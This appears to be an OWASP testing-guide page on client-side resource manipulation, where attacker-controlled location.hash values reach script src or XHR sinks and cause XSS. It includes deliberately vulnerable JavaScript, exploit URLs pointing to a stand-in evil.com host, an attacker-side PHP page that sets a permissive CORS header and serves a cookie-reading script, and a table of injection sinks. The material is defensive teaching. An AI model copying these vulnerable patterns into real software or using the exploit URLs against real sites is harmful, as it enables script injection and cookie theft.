## Summary

A Client Side Resource Manipulation vulnerability is an input validation
flaw that occurs when an application accepts an user controlled input
which specifies the path of a resource (for example the source of an
iframe, js, applet or the handler of an XMLHttpRequest). Specifically,
such a vulnerability consists in the ability to control the URLs which
link to some resources present in a web page. The impact may vary on the
basis of the type of the element whose URL is controlled by the
attacker, and it is usually adopted to conduct Cross-Site Scripting
attacks.

## How to Test

Such a vulnerability occurs when the application employs user controlled
URLs for referencing external/internal resources. In these circumstances
it is possible to interfere with the expected application's behavior in
the sense of making it load and render malicious objects.

The following JavaScript code shows a possible vulnerable script in
which the attacker is able to control the "location.hash" (source) which
reaches the attribute "src" of a script element. This particular
obviously leads XSS since an external JavaScript could be easily
injected in the trusted web site.

    <script>
      var d=document.createElement("script");
      if(location.hash.slice(1))
         d.src = location.hash.slice(1);
      document.body.appendChild(d);
    </script>

Specifically the attacker could target the victim by asking her to visit
the following URL:

`www.victim.com/#http://evil.com/js.js`

Where js.js contains:

    alert(document.cookie)

Controlling scripts' sources is a basic example, since some other
interesting and more subtle cases can take place. A widespread scenario
involves the possibility to control the URL called in a CORS request;
since CORS allows the target resource to be accessible by the requesting
domain through a header based approach, then the attacker may ask the
target page to load malicious content loaded on its own web site.

Refer to the following vulnerable code:

    <b id="p"></b>
    <script>
     function createCORSRequest(method, url) {
      var xhr = new XMLHttpRequest();
      xhr.open(method, url, true);
      xhr.onreadystatechange = function () {
       if (this.status == 200 && this.readyState == 4) {
         document.getElementById('p').innerHTML = this.responseText;
       }
      };
      return xhr;
     }

     var xhr = createCORSRequest('GET', location.hash.slice(1));
     xhr.send(null);
    </script>

The “location.hash” is controlled by the attacker and it is used for
requesting an external resource, which will be reflected through the
construct “innerHTML”. Basically the attacker could ask the victim to
visit the following URL and at the same time he could craft the payload
handler.

Exploit URL: www.victim.com/\#http://evil.com/html.html

    http://evil.com/html.html
    ----
    <?php
    header('Access-Control-Allow-Origin: http://www.victim.com');
    ?>
    <script>alert(document.cookie);</script>

### Black Box testing

Black box testing for Client Side Resource Manipulation is not usually
performed since access to the source code is always available as it
needs to be sent to the client to be executed.

### Gray Box testing

**Testing for Client Side Resource Manipulation vulnerabilities:**
To manually check for this type of vulnerability we have to identify
whether the application employs inputs without correctly validating
them; these are under the control of the user which could be able to
specify the url of some resources. Since there are many resources that
could be included into the application (for example images, video,
object, css, frames etc.), client side scripts which handle the
associated URLs should be investigated for potential issues.

The following table shows the possible injection points (sink) that
should be checked:

| scope="col"  | Resource Type                           | scope="col" | Tag/Method | scope="col" | Sink |
| ------------ | --------------------------------------- | ----------- | ---------- | ----------- | ---- |
| Frame        | iframe                                  | src         |            |             |      |
| Link         | a                                       | href        |            |             |      |
| AJAX Request | xhr.open(method, <i>\[url\]</i>, true); | URL         |            |             |      |
| CSS          | link                                    | href        |            |             |      |
| Image        | img                                     | src         |            |             |      |
| Object       | object                                  | data        |            |             |      |
| Script       | script                                  | src         |            |             |      |

The most interesting ones are those that allow to an attacker to include
client side code (for example JavaScript) since it could lead to an XSS
vulnerabilities.

When trying to check for this kind of issues, consider that some
characters are treated differently by different browsers. Moreover
always consider the possibility to try absolute URLs variants as
described here: <http://kotowicz.net/absolute/>

## Tools

  - DOMinator - <https://dominator.mindedsecurity.com/>

## References

**OWASP Resources**

  - [DOM based XSS Prevention Cheat
    Sheet](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink")
  - DOMXSS.com - <http://www.domxss.com>
  - DOMXSS TestCase -
    <http://www.domxss.com/domxss/01_Basics/04_script_src.html>

**Whitepapers**

  - DOM XSS Wiki
    - https://code.google.com/p/domxsswiki/wiki/LocationSources
  - Krzysztof Kotowicz: "Local or External? Weird URL formats on the
    loose" - <http://kotowicz.net/absolute/>